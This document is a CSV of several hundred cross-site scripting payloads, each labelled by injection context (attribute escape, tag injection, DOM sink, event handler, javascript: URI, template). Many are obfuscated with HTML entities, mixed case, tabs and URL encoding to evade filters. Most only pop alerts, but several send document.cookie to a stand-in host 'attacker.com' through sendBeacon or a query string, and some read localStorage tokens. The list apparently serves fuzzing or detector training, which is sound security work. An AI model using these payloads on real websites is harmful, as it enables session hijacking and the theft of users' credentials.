payload,context
"__proto__[""ondragover""]=prompt('XSS')",dom_sink
<body/onclose=console.log(%27XSS%27)>,tag_injection
`><img src=x onended=prompt('XSS')>,attribute_escape
"""><img src=x onscrollsnapchange=console.log(location.hash)>",attribute_escape
ondragenter=javascr	ipt:prompt(document.domain),event_handler
"<&#97;r&#101;&#97;
onclos&#101;=prompt(1)>",tag_injection
"\' onmouseenter=confirm(String.fromCharCode(88,83,83))//",attribute_escape
<soUrcE oNinPut=alErt(loCatIon.haSh) onInpUt=AleRt(LocAtiOn.HasH)>,tag_injection
"`><img src=x onpoint&#101;rup=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape
document.write(%22<img src=x onerror=console.log(document.cookie)>%22),dom_sink
"location=""javascr	ipt:fetch(navigator.sendBeacon('//attacker.com',document.cookie))""",dom_sink
%27><img src=x oncopy=console.log(1)>,attribute_escape
%3Cform/onwebkitanimationend=prompt('XSS')%3E,tag_injection
	onr&#101;p&#101;&#97;t=&#97;l&#101;rt(loc&#97;tion.h&#97;sh),event_handler
"\"" onplay=prompt(String.fromCharCode(88,83,83))//",attribute_escape
"s&#101;tInt&#101;rv&#97;l(""&#97;l&#101;rt(1)"",100)",dom_sink
<svG	oNprOmpTdiSmiSs=AleRt(LocAtiOn.HasH)>,tag_injection
<meta ontransitionstart=alert(location.hash)>,tag_injection
"""><img src=x onk&#101;ydown=prompt('XSS')>",attribute_escape
%3C!--%3E%3Cmtext onstalled=console.log(document.domain)%3E,tag_injection
"""><form onwebkitanimationend=prompt('XSS')>",tag_injection
""" ><svg onplaying=alert(location.hash)>",attribute_escape
 onBefOreCopY=cOnsOle.loG('XSS'),event_handler
""" onmous&#101;ov&#101;r=&#97;l&#101;rt(docum&#101;nt.dom&#97;in) x=""",attribute_escape
"\"" onpoint&#101;rr&#97;wupd&#97;t&#101;=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)//",attribute_escape
onpointerup=\u0061lert&#40;document.domain&#41;,event_handler
" ondrop=confirm(String.fromCharCode(88,83,83))",event_handler
ondr&#97;gov&#101;r=j&#97;v&#97;script:confirm(1),event_handler
' ><svg onended=\u0061lert('XSS')>,attribute_escape
"docum&#101;nt.body.inn&#101;rHTML=""<img src=x on&#101;rror=f&#101;tch(docum&#101;nt.cooki&#101;+'&loc='+loc&#97;tion.hr&#101;f)>""",dom_sink
ondragover=prompt('XSS'),event_handler
%3Cmath src=x onpromptaction=prompt(1)%3E,tag_injection
<blink	onkeypress=prompt(document.domain)>,tag_injection
' onwebkitanimationend=console.log(document.domain) ',attribute_escape
"location=""javascr	ipt:XMLHttpRequest(location.hash)""",dom_sink
%3Cbutton src=x onclick=console.log(1)%3E,tag_injection
'><img src=x onanimationend=confirm(document.domain)>,attribute_escape
'><img src=x onbeforeinput=console.log('XSS')>,attribute_escape
"""><img src=x oncopy=confirm(location.hash)>",attribute_escape
<blInk	onPopStaTe=ConSolE.lOg(DocUmeNt.DomAin)>,tag_injection
\' ondblclick=\u0061lert(1)//,attribute_escape
<video src=x onclick=console.log('XSS')>,tag_injection
%3Ctitle x=y onstalled=alert('XSS')%3E,tag_injection
'><img src=x ontouch&#101;nd=consol&#101;.log('XSS')>,attribute_escape
"location.href=""javascr	ipt:console.log(location.hash)""",dom_sink
' onpoint&#101;rdown=consol&#101;.log(docum&#101;nt.dom&#97;in) ',attribute_escape
""" %3E%3Csvg onended=prompt('XSS')%3E",attribute_escape
onmozfullscreenchange=prompt/***/(%27XSS%27),event_handler
<td/on&#101;nd=consol&#101;.log(docum&#101;nt.dom&#97;in)>,tag_injection
\' OnmOusEwhEel=prOmpT(dOcuMenT.dOmaIn)//,attribute_escape
"document.write(""<img src=x onerror=confirm(document.domain)>"")",dom_sink
"<scr	ipt>setTimeout('confirm(document.domain)',0)</scr	ipt>",script_injection
%3Ctable oncopy=confirm('XSS') oncopy=confirm('XSS')%3E,tag_injection
&quot; ondblclick=consol&#101;.log('XSS') x=&quot;,attribute_escape
'%3E%3Cimg src=x onwaiting=prompt(document.domain)%3E,attribute_escape
"	onwebkittransitionend=alert(String.fromCharCode(88,83,83))",event_handler
""" ><svG oNfoCusIn=ConSolE.lOg(LocAtiOn.HasH)>",attribute_escape
"Object.assign(window,{""onanimationcancel"":XMLHttpRequest})",dom_sink
"document.body.innerHTML=""<img src=x onerror=prompt(String.fromCharCode(88,83,83))>""",dom_sink
"""><table onselect=confirm(document.domain)>",tag_injection
<img onwebkitfullscreenchange=\u0061lert('XSS') onwebkitfullscreenchange=\u0061lert('XSS')>,tag_injection
"'><img src=x onpromptdismiss=prompt(String.fromCharCode(88,83,83))>",attribute_escape
"__pRotO__[""oNbeForEpaSte""]=XMLHttPReQueSt(LocAtiOn.HasH)",dom_sink
<script>prompt('XSS')</script>,script_injection
"&#101;l&#101;m&#101;nt.s&#101;tAttribut&#101;(""onclick"",""&#97;l&#101;rt(loc&#97;tion.h&#97;sh)"")",dom_sink
<video x=y onmozfullscreenchange=prompt(%27XSS%27)>,tag_injection
onw&#101;bkit&#97;nim&#97;tion&#101;nd=&#97;l&#101;rt/*x*/(1),event_handler
"element.insertAdjacentHTML(%22beforeend%22,%22<img src=x onerror=alert(1)>%22)",dom_sink
<embed/onmouseenter=confirm(%27XSS%27)>,tag_injection
<table onselect=prompt(1) onselect=prompt(1)>,tag_injection
%22><img src=x onbeforematch=alert(%27XSS%27)>,attribute_escape
<!--><ForM oNseArcH=cOnsOle.loG(1)>,tag_injection
<span onsecuritypolicyviolation=alert(location.hash)>,tag_injection
"onpoint&#101;rc&#97;nc&#101;l=confirm&#40;String.fromCh&#97;rCod&#101;(88,83,83)&#41;",event_handler
%27 ><svg ontoggle=console.log(1)>,attribute_escape
"location=""javascript:XMLHttpRequest(document.cookie)""",dom_sink
<foRm Src=x OnpAgeRevEal=coNsoLe.Log(loCatIon.haSh)>,tag_injection
"(new Function(""alert('XSS')""))();",dom_sink
""" %3E%3Csvg onkeypress=alert(1)%3E",attribute_escape
"__pRotO__[""oNmoUseDowN""]=evAl(DocUmeNt.CooKie)",dom_sink
"Obj&#101;ct.&#97;ssign(window,{""oncopy"":&#97;l&#101;rt})",dom_sink
%27 onpointerdown=alert(document.domain) %27,attribute_escape
"EleMenT.iNseRtADjaCenTHTML(""beForEenD"",""<iMg Src=x OneRroR=pRomPt(1)>"")",dom_sink
document.body.innerHTML=%22<img src=x onerror=console.log(document.domain)>%22,dom_sink
"__proto__[""ongotpointercapture""]=alert(document.cookie+'&loc='+location.href)",dom_sink
"""><listing onpointerrawupdate=\u0061lert('XSS')>",tag_injection
' oninvalid=alert(document.domain) ',attribute_escape
"\"" onanimationend=confirm(location.hash)//",attribute_escape
%3Cscript onclick=prompt('XSS')%3E,tag_injection
\' OndRagEntEr=ConFirM('XSS')//,attribute_escape
<scRipT>//prOmpT(1)</ScrIpt>,script_injection
""" onw&#101;bkitfullscr&#101;&#101;nch&#97;ng&#101;=consol&#101;.log(docum&#101;nt.dom&#97;in) """,attribute_escape
'%3E%3Cimg src=x ontouchend=prompt('XSS')%3E,attribute_escape
"<blink
onmouseup=\u0061lert(1)>",tag_injection
`><img src=x onmousedown=console.log(%27XSS%27)>,attribute_escape
"%22><img src=x oncut=prompt(String.fromCharCode(88,83,83))>",attribute_escape
%3C%= confirm(document.domain) %%3E,template_injection
"<xmp	onmous&#101;wh&#101;&#101;l=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
javascr	ipt:confirm/***/('XSS'),js_uri
""" onpagereveal=console.log(1) """,attribute_escape
OntRanSitIonStaRt=ConSolE.lOg&#40;loCatIon.haSh&#41;,event_handler
`><img src=x ongotpointercapture=\u0061lert(document.domain)>,attribute_escape
OniNpuT=pRomPt/*x*/('XSS'),event_handler
OndRagEntEr=ProMpt/**/(dOcuMenT.dOmaIn),event_handler
"&#101;l&#101;m&#101;nt.s&#101;tAttribut&#101;(""onclick"",""XMLHttpR&#101;qu&#101;st(loc&#97;tion.h&#97;sh)"")",dom_sink
\' OnwHeeL=cOnsOle.loG(dOcuMenT.dOmaIn)//,attribute_escape
&quot; onpl&#97;y=confirm('XSS') x=&quot;,attribute_escape
<animatemotion onwaiting=alert(location.hash)>,tag_injection
oncont&#101;xtm&#101;nu=confirm('XSS'),event_handler
onmousedown=confirm(1),event_handler
"'><img src=x onpoint&#101;rup=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape
<anImaTemOtiOn	OndRop=coNfiRm(LocAtiOn.HasH)>,tag_injection
""" ><svg onwebkitfullscreenchange=console.log(document.domain)>",attribute_escape
' onpointerdown=\u0061lert(document.domain) ',attribute_escape
' ><svg onpromptdismiss=prompt(location.hash)>,attribute_escape
	onst&#97;ll&#101;d=confirm(loc&#97;tion.h&#97;sh),event_handler
"SetTimEouT(""ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83))"",0)",dom_sink
"<xmp	ontouch&#101;nd=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
%27><img src=x onended=console.log(document.domain)>,attribute_escape
<scRipT oNdbLclIck=prOmpT(1) oNdbLclIck=prOmpT(1)>,tag_injection
"""%3E%3Cimg src=x ontouchstart=alert(String.fromCharCode(88,83,83))%3E",attribute_escape
"loc&#97;tion.hr&#101;f=""j&#97;v&#97;script:f&#101;tch(String.fromCh&#97;rCod&#101;(88,83,83))""",dom_sink
"%22 onpromptdismiss=prompt(String.fromCharCode(88,83,83)) %22",attribute_escape
"DocUmeNt.BodY.iNneRHTML=""<iMg Src=x OneRroR=pRomPt(LocAlSTorAge.geTItEm('toKen'))>""",dom_sink
"ObjEct.asSigN(wIndOw,{""oNpoIntErmOve"":cOnsOle.loG})",dom_sink
<&#97;udio	onpopst&#97;t&#101;=confirm(loc&#97;tion.h&#97;sh)>,tag_injection
""" ><svg onkeypress=\u0061lert('XSS')>",attribute_escape
"java
scr	ipt:alert('XSS')",js_uri
"OnbEgiN=cOnfIrm/**/(STriNg.FroMChArCOde(88,83,83))",event_handler
"__proto__[""onanimationend""]=fetch(location.hash)",dom_sink
""" ><svG oNwaItiNg=ConFirM(dOcuMenT.dOmaIn)>",attribute_escape
<!--><AniMatEtrAnsForM oNpoIntErdOwn=prOmpT(1)>,tag_injection
' %3E%3Csvg onpagehide=console.log(document.domain)%3E,attribute_escape
"__pRotO__[""oNbeForEcuT""]=alErt(loCalStoRagE.gEtITem('tOkeN'))",dom_sink
<baSe/OntRanSitIonStaRt=ProMpt(loCatIon.haSh)>,tag_injection
'><Img srC=x onSecUriTypOliCyvIolAtiOn=ProMpt(1)>,attribute_escape
onsecuritypolicyviolation=javascr	ipt:console.log(document.domain),event_handler
<meta onpointerover=confirm(1)/>,tag_injection
"<p onb&#101;for&#101;toggl&#101;=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83)) onb&#101;for&#101;toggl&#101;=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
%3Canimatemotion/onsecuritypolicyviolation=console.log('XSS')%3E,tag_injection
 ondblclick=console.log(1),event_handler
ongotpointercapture=console.log/*x*/(%27XSS%27),event_handler
' ><svG oNpoPstAte=alErt(loCatIon.haSh)>,attribute_escape
' onmousewheel=\u0061lert(document.domain) ',attribute_escape
""" onmous&#101;ov&#101;r=prompt(docum&#101;nt.dom&#97;in) x=""",attribute_escape
<script>console.log`location.hash`</script>,script_injection
<&#101;mb&#101;d onw&#101;bkitfullscr&#101;&#101;nch&#97;ng&#101;=confirm(loc&#97;tion.h&#97;sh) onw&#101;bkitfullscr&#101;&#101;nch&#97;ng&#101;=confirm(loc&#97;tion.h&#97;sh)>,tag_injection
"__proto__[""onpause""]=prompt(document.cookie+'&loc='+location.href)",dom_sink
"EleMenT.sEtATtrIbuTe(""onCliCk"",""pRomPt(DocUmeNt.CooKie+'&Loc='+LocAtiOn.HreF)"")",dom_sink
"location.href=""javascript:eval(btoa(document.cookie))""",dom_sink
\%22 onselect=prompt(1)//,attribute_escape
"""><img src=x oncut=console.log(String.fromCharCode(88,83,83))>",attribute_escape
' ><svg ontouchst&#97;rt=confirm('XSS')>,attribute_escape
'><Img srC=x onWebKitAniMatIonEnd=prOmpT(1)>,attribute_escape
	onFocUsoUt=AleRt('XSS'),event_handler
"document.write(""%3Cimg src=x onerror=prompt(document.cookie+'&loc='+location.href)%3E"")",dom_sink
OnsUbmIt=ProMpt/***/(DocUmeNt.DomAin),event_handler
"	ongestureend=confirm(String.fromCharCode(88,83,83))",event_handler
"""><Img srC=x onErrOr=AleRt(DocUmeNt.DomAin)>",attribute_escape
<select	onpointermove=prompt(%27XSS%27)>,tag_injection
onpaste=javascript:\u0061lert(1),event_handler
<link ondrop=prompt(docum&#101;nt.dom&#97;in)>,tag_injection
"%3Cxmp	onmousewheel=prompt(String.fromCharCode(88,83,83))%3E",tag_injection
' ><svg on&#97;uxclick=&#97;l&#101;rt(1)>,attribute_escape
"<tr ontransitionend=prompt(String.fromCharCode(88,83,83))/>",tag_injection
"\"" onp&#97;g&#101;hid&#101;=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)//",attribute_escape
<%= prompt(1) %>,template_injection
""" %3E%3Csvg onanimationiteration=console.log(document.domain)%3E",attribute_escape
onwheel=javascript:alert(1),event_handler
OndRagOveR=pRomPt&#40;doCumEnt.doMaiN&#41;,event_handler
onpointermove=confirm/***/('XSS'),event_handler
<t&#101;mpl&#97;t&#101;	onr&#101;s&#101;t=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,tag_injection
' onfocusout=\u0061lert(location.hash) ',attribute_escape
<area src=x onclose=prompt(1)>,tag_injection
"`%3E%3Cimg src=x oncut=console.log(String.fromCharCode(88,83,83))%3E",attribute_escape
%3Cobject	onanimationcancel=alert(document.domain)%3E,tag_injection
"\' onmozfullscr&#101;&#101;nch&#97;ng&#101;=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))//",attribute_escape
<&#97;udio onmous&#101;ov&#101;r=consol&#101;.log('XSS') onmous&#101;ov&#101;r=consol&#101;.log('XSS')>,tag_injection
document.write(%22<img src=x onerror=eval(document.cookie)>%22),dom_sink
eval(%22prompt(btoa(document.cookie))%22),dom_sink
""" %3E%3Csvg oncanplay=console.log(String.fromCharCode(88,83,83))%3E",attribute_escape
"&#101;v&#97;l(""&#101;v&#97;l(String.fromCh&#97;rCod&#101;(88,83,83))"")",dom_sink
""" onpagehide=console.log(document.domain) """,attribute_escape
%22 oncopy=console.log(location.hash) %22,attribute_escape
""" ><svg oninput=alert(1)>",attribute_escape
<scRipT>//coNfiRm('XSS')</sCriPt>,script_injection
""" %3E%3Csvg onauxclick=console.log(1)%3E",attribute_escape
"&quot; onanimationiteration=alert(String.fromCharCode(88,83,83)) x=&quot;",attribute_escape
"__proto__[""onmous&#101;ov&#101;r""]=XMLHttpR&#101;qu&#101;st(1)",dom_sink
"Object.assign(window,{""onanimationstart"":\u0061lert})",dom_sink
OncUt=AleRt(1),event_handler
%3Caudio onpopstate=confirm(location.hash) onpopstate=confirm(location.hash)%3E,tag_injection
"<script>setTimeout(%27confirm(location.hash)%27,0)</script>",script_injection
"Obj&#101;ct.&#97;ssign(window,{""onh&#97;shch&#97;ng&#101;"":XMLHttpR&#101;qu&#101;st})",dom_sink
"\"" ong&#101;stur&#101;st&#97;rt=&#97;l&#101;rt(1)//",attribute_escape
<body/onclos&#101;=consol&#101;.log('XSS')>,tag_injection
"<form	onwebkitfullscreenchange=console.log(String.fromCharCode(88,83,83))>",tag_injection
JavAscRipT:cOnfIrm/***/(1),js_uri
"<plaintext
onpagereveal=\u0061lert(location.hash)>",tag_injection
"<meta onhashchange=confirm(String.fromCharCode(88,83,83))>",tag_injection
<td on&#101;nd=consol&#101;.log(docum&#101;nt.dom&#97;in) on&#101;nd=consol&#101;.log(docum&#101;nt.dom&#97;in)>,tag_injection
"""%3E%3Cimg src=x ontransitionend=alert(document.domain)%3E",attribute_escape
"`><img src=x onprompt&#97;ction=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape
"<p x=y onb&#101;for&#101;toggl&#101;=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
javascript:alert/**/(%27XSS%27),js_uri
<a/onbeforematch=prompt(document.domain)>,tag_injection
"ObjEct.asSigN(wIndOw,{""oNenDed"":cOnfIrm})",dom_sink
	on&#101;nd=&#97;l&#101;rt(1),event_handler
"\"" onwheel=prompt(location.hash)//",attribute_escape
"setTimeout(%22fetch(%27XSS%27)%22,0)",dom_sink
<teMplAte onCloSe=ConSolE.lOg(1)/>,tag_injection
%3Cxmp	ontransitionend=alert(location.hash)%3E,tag_injection
java	script:confirm(location.hash),js_uri
"<td
onmozfullscr&#101;&#101;nch&#97;ng&#101;=consol&#101;.log(loc&#97;tion.h&#97;sh)>",tag_injection
""" ><svG oNbeGin=coNfiRm(LocAtiOn.HasH)>",attribute_escape
<t&#97;bl&#101; x=y oninv&#97;lid=prompt('XSS')>,tag_injection
 ondrop=alert(document.domain),event_handler
"document.body.innerHTML=%22<img src=x onerror=console.log(navigator.sendBeacon(%27//attacker.com%27,document.cookie))>%22",dom_sink
	onPoiNteRraWupDatE=pRomPt('XSS'),event_handler
"\"" ondrop=confirm(loc&#97;tion.h&#97;sh)//",attribute_escape
 onInvAliD=cOnfIrm(1),event_handler
"element.insertAdjacentHTML(%22beforeend%22,%22<img src=x onerror=confirm(location.hash)>%22)",dom_sink
%27><img src=x onended=alert(1)>,attribute_escape
%3Cblink/onmouseup=alert(1)%3E,tag_injection
"%3Cmarquee x=y onpromptdismiss=console.log(String.fromCharCode(88,83,83))%3E",tag_injection
%27 ><svg onpagehide=prompt(%27XSS%27)>,attribute_escape
'%3E%3Cscript%3Econfirm(document.domain)%3C/script%3E,script_injection
<listing onkeyup=alert(location.hash)/>,tag_injection
"element.insertAdjacentHTML(%22beforeend%22,%22<img src=x onerror=alert(localStorage.getItem(%27token%27))>%22)",dom_sink
"ObjEct.asSigN(wIndOw,{""oNinPut"":aLerT})",dom_sink
<script onk&#101;ydown=confirm(docum&#101;nt.dom&#97;in)/>,tag_injection
ondrop=console.log&#40;document.domain&#41;,event_handler
" ondblclick=prompt(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler
"Object.assign(window,{""onpromptaction"":console.log})",dom_sink
"%22 ><svg ontransitionstart=confirm(String.fromCharCode(88,83,83))>",attribute_escape
%22 onselect=console.log(location.hash) %22,attribute_escape
`%3E%3Cimg src=x onmousewheel=alert(1)%3E,attribute_escape
"Object.assign(window,{""onauxclick"":alert})",dom_sink
<!--><video ondragstart=\u0061lert('XSS')>,tag_injection
"' oncut=prompt(String.fromCharCode(88,83,83)) '",attribute_escape
'><img src=x onmouseenter=\u0061lert(location.hash)>,attribute_escape
"java	script:\u0061lert(String.fromCharCode(88,83,83))",js_uri
""" ><svg onbeforecut=\u0061lert(document.domain)>",attribute_escape
"""><img src=x ontouchend=\u0061lert('XSS')>",attribute_escape
"""><tr ontouchst&#97;rt=confirm(loc&#97;tion.h&#97;sh)>",tag_injection
javascript:alert/**/(1),js_uri
onpl&#97;ying=prompt&#40;docum&#101;nt.dom&#97;in&#41;,event_handler
' ><svG oNbeForEpaSte=coNfiRm(DocUmeNt.DomAin)>,attribute_escape
'><Img srC=x onProMptDisMisS=pRomPt(LocAtiOn.HasH)>,attribute_escape
"' onanimationcancel=\u0061lert(String.fromCharCode(88,83,83)) '",attribute_escape
<xss src=x ontoggl&#101;=consol&#101;.log('XSS')>,tag_injection
%3Cform onwebkittransitionend=prompt(location.hash) onwebkittransitionend=prompt(location.hash)%3E,tag_injection
<form onreset=console.log(document.domain) onreset=console.log(document.domain)>,tag_injection
""" onfocus=consol&#101;.log(loc&#97;tion.h&#97;sh) &#97;utofocus=""",attribute_escape
%3Ca onmozfullscreenchange=alert(location.hash) onmozfullscreenchange=alert(location.hash)%3E,tag_injection
""" onb&#101;gin=consol&#101;.log(loc&#97;tion.h&#97;sh) """,attribute_escape
"ongotpointercapture=console.log/**/(String.fromCharCode(88,83,83))",event_handler
__proto__[%22onerror%22]=alert(%27//attacker.com/?c=%27+document.cookie),dom_sink
"<&#97;nim&#97;t&#101;tr&#97;nsform src=x ondr&#97;gov&#101;r=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
<xmp ontransitionend=alert(location.hash) ontransitionend=alert(location.hash)>,tag_injection
"Object.assign(window,{""ontransitionend"":alert})",dom_sink
 onanimationcancel=prompt(location.hash),event_handler
<scr	ipt>/*/console.log(1)</scr	ipt>,script_injection
"<b&#97;s&#101;	ontouchmov&#101;=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
"&quot; onpromptdismiss=confirm(String.fromCh&#97;rCod&#101;(88,83,83)) x=&quot;",attribute_escape
"javascr	ipt:alert/*x*/(String.fromCharCode(88,83,83))",js_uri
"Object.assign(window,{""onanimationend"":XMLHttpRequest})",dom_sink
<m&#97;rqu&#101;&#101; on&#97;uxclick=prompt(loc&#97;tion.h&#97;sh) on&#97;uxclick=prompt(loc&#97;tion.h&#97;sh)>,tag_injection
%27 onmousedown=console.log(%27XSS%27) %27,attribute_escape
"\"" OnmOzfUllScrEenChaNge=alErt(1)//",attribute_escape
"<teMplAte	onBegIn=AleRt(StrIng.frOmCHarCodE(88,83,83))>",tag_injection
'><Img srC=x onInvAliD=cOnfIrm(1)>,attribute_escape
onend=console.log/***/(1),event_handler
<object onvolumechange=\u0061lert(1) onvolumechange=\u0061lert(1)>,tag_injection
%27><img src=x onpointermove=confirm(document.domain)>,attribute_escape
"\' OndBlcLicK=aLerT(STriNg.FroMChArCOde(88,83,83))//",attribute_escape
__proto__[%22onpageshow%22]=eval(document.cookie),dom_sink
<plAinTexT x=y OnrEpeAt=ProMpt('XSS')>,tag_injection
"	onfocus=prompt(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler
 onh&#97;shch&#97;ng&#101;=consol&#101;.log(loc&#97;tion.h&#97;sh),event_handler
"""><Img srC=x onSecUriTypOliCyvIolAtiOn=ConSolE.lOg(DocUmeNt.DomAin)>",attribute_escape
<select x=y ongotpointercapture=confirm(document.domain)>,tag_injection
"JavAscRipT:vOid(coNfiRm(StrIng.frOmCHarCodE(88,83,83)))",js_uri
<img x=y onkeypress=console.log(1)>,tag_injection
__proto__[%22onbeforecut%22]=eval(%27//attacker.com/?c=%27+document.cookie),dom_sink
__proto__[%22oninput%22]=alert(document.domain),dom_sink
"document.write(""%3Cimg src=x onerror=console.log(location.hash)%3E"")",dom_sink
"&quOt; onPasTe=ConFirM(STriNg.FroMChArCOde(88,83,83)) X=&QuoT;",attribute_escape
<iframe oninput=console.log(location.hash) oninput=console.log(location.hash)>,tag_injection
"OnsEleCt=ProMpt/*x*/(StrIng.frOmCHarCodE(88,83,83))",event_handler
&quot; onpopstate=alert('XSS') x=&quot;,attribute_escape
<scr	ipt>confirm`'XSS'`</scr	ipt>,script_injection
"%22 ><svg onpointerover=confirm(String.fromCharCode(88,83,83))>",attribute_escape
window[%22XMLHttpRequest%22](%27XSS%27),dom_sink
<diV oNpaUse=coNfiRm(LocAtiOn.HasH)/>,tag_injection
"SetIntErvAl(""coNsoLe.Log(loCatIon.haSh)"",100)",dom_sink
"""><Img srC=x onStaLleD=pRomPt(1)>",attribute_escape
"\' onk&#101;ydown=prompt(String.fromCh&#97;rCod&#101;(88,83,83))//",attribute_escape
' ><svg onb&#101;gin=confirm(1)>,attribute_escape
""" ondblclick=console.log(String.fromCharCode(88,83,83)) """,attribute_escape
"Object.assign(window,{""onauxclick"":fetch})",dom_sink
"__proto__[""ondragenter""]=alert(location.hash)",dom_sink
<tiTle srC=x onMozFulLscReeNchAngE=pRomPt('XSS')>,tag_injection
"""><img src=x onanimationend=console.log('XSS')>",attribute_escape
__proto__[%22onwebkitfullscreenchange%22]=prompt(document.cookie+%27&loc=%27+location.href),dom_sink
"&#101;v&#97;l(""f&#101;tch(loc&#97;tion.h&#97;sh)"")",dom_sink
onmous&#101;wh&#101;&#101;l=consol&#101;.log&#40;'XSS'&#41;,event_handler
%27><img src=x onbeforepaste=alert(1)>,attribute_escape
"(new Function(""eval(location.hash)""))();",dom_sink
<script>Function(%27alert(1)%27)();</script>,script_injection
"&#101;v&#97;l(""&#101;v&#97;l(docum&#101;nt.cooki&#101;+'&loc='+loc&#97;tion.hr&#101;f)"")",dom_sink
"""><img src=x onfocusin=prompt(1)>",attribute_escape
""" onpoint&#101;rr&#97;wupd&#97;t&#101;=&#97;l&#101;rt(loc&#97;tion.h&#97;sh) """,attribute_escape
onscrollsn&#97;pch&#97;ng&#101;=&#97;l&#101;rt/***/(loc&#97;tion.h&#97;sh),event_handler
"""%3E%3Canimatemotion ongesturestart=confirm(1)%3E",tag_injection
<listing	onk&#101;yup=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,tag_injection
<!--><audio onmouseover=console.log(%27XSS%27)>,tag_injection
onk&#101;ypr&#101;ss=consol&#101;.log&#40;loc&#97;tion.h&#97;sh&#41;,event_handler
""" ><svG oNpoIntErmOve=alErt(doCumEnt.doMaiN)>",attribute_escape
'><img src=x onerror=alert(document.domain)>,attribute_escape
' ><svg onscrollsn&#97;pch&#97;ng&#101;=&#97;l&#101;rt(1)>,attribute_escape
"Object.assign(window,{%22onblur%22:XMLHttpRequest})",dom_sink
""" onfocus=prompt(1) autofocus=""",attribute_escape
""" ><svg onfullscr&#101;&#101;nch&#97;ng&#101;=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>",attribute_escape
<s&#101;t src=x onc&#97;npl&#97;y=confirm(1)>,tag_injection
'><img src=x ontoggl&#101;=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)>,attribute_escape
"<diV/oNpaUse=prOmpT(STriNg.FroMChArCOde(88,83,83))>",tag_injection
 onmousedown=console.log('XSS'),event_handler
"setTimeout(%22prompt(String.fromCharCode(88,83,83))%22,0)",dom_sink
j&#97;v&#97;	script:&#97;l&#101;rt(loc&#97;tion.h&#97;sh),js_uri
&quOt; onErrOr=AleRt(1) X=&QuoT;,attribute_escape
<script>/x/alert(%27XSS%27)</script>,script_injection
%27 ><svg onpointermove=alert(document.domain)>,attribute_escape
<math/onmouseup=console.log(document.domain)>,tag_injection
`><img src=x ontouchmove=confirm(%27XSS%27)>,attribute_escape
onanimationiteration=prompt/***/(document.domain),event_handler
'><Img srC=x onScrOllSnaPchAngE=cOnfIrm('XSS')>,attribute_escape
ondragstart=confirm&#40;1&#41;,event_handler
"""><Img srC=x onHasHchAngE=cOnfIrm(doCumEnt.doMaiN)>",attribute_escape
<body src=x onclose=console.log(%27XSS%27)>,tag_injection
\%22 oncopy=prompt(document.domain)//,attribute_escape
' onwebkitfullscreenchange=console.log(document.domain) ',attribute_escape
"<script
>prompt(String.fromCharCode(88,83,83))</script>",script_injection
"<t&#101;mpl&#97;t&#101;
oncont&#101;xtm&#101;nu=consol&#101;.log(1)>",tag_injection
%3Cselect	onsecuritypolicyviolation=confirm(location.hash)%3E,tag_injection
(new Function(%22eval(document.domain)%22))();,dom_sink
"""><img src=x onauxclick=confirm(location.hash)>",attribute_escape
""" ><svG oNpaGehIde=coNsoLe.Log(doCumEnt.doMaiN)>",attribute_escape
""" %3E%3Csvg ontransitionstart=confirm(document.domain)%3E",attribute_escape
""" ><svg onpoint&#101;rc&#97;nc&#101;l=consol&#101;.log(docum&#101;nt.dom&#97;in)>",attribute_escape
OnwEbkItfUllScrEenChaNge=jaVasCriPt:AleRt(DocUmeNt.DomAin),event_handler
%3Cform onsearch=console.log(1)%3E,tag_injection
